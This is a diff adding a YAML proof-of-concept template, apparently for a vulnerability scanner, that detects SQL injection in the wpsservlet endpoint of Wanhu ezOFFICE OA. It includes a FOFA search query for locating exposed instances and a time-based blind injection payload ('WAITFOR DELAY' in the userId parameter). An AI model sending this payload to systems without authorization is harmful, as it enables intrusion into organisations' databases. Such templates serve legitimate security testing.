@@ -1,0 +1,33 @@
+id: poc-yaml-wanhu-oa-wpsservlet-sqli
+info:
+  name: 万户Ezoffice wpsservlet SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /defaultroot/login.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,`whirRootPath = "/defaultroot"`) &&
+
+    contains(body,"login.jsp")
+
+    '
+- method: GET
+  path: /defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--&orgIdString=1&domainId=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"[]") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
